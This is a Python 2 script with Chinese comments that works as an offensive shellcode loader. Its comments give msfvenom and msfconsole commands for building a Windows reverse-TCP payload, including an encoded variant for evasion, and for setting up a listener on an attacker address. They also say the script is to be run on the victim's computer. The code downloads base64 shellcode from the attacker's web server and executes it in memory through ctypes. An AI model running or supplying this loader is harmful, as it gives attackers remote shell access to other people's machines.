#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Python 方式的 shellcode 执行

# Metasploit 下载
# http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
# http://downloads.metasploit.com/data/releases/metasploit-latest-linux-installer.run
# http://downloads.metasploit.com/data/releases/metasploit-latest-windows-installer.exe

# 使用 msfconsole 生成 shellcode.raw
# msf > use windows/shell/reverse_tcp
# msf payload(reverse_tcp) > generate -o LHOST=192.168.1.222,LPORT=4444 -t raw -f shellcode.raw

# 在 Linux 中用命令生成 shellcode.raw
# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.222 LPORT=4444 -f raw -o shellcode.raw

# 直接使用 generate_shellcode.py 生成 shellcode.bin

# 启动渗透监听（192.168.1.222 为攻击电脑地址）
# msf > use exploit/multi/handler
# msf exploit(handler) > set PAYLOAD windows/shell/reverse_tcp
# msf exploit(handler) > set LHOST 192.168.1.222
# msf exploit(handler) > set LPORT 4444
# msf exploit(handler) > exploit

# 在被攻击电脑上运行此脚本

# 直接生成的可执行文件测试（含加密方法）
# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.222 LPORT=4444 -e x86/shikata_ga_nai -i 5 -b '\x00' -f exe -o shellcode.exe

import urllib2
import ctypes
import base64

# Retrieve the shellcode from our web server
url = "http://192.168.1.222:8000/shellcode.bin"
response = urllib2.urlopen(url)

# Decode the shellcode from base64
shellcode = base64.b64decode(response.read())

# Create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# Create a function pointer to our shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# Call our shellcode
shellcode_func()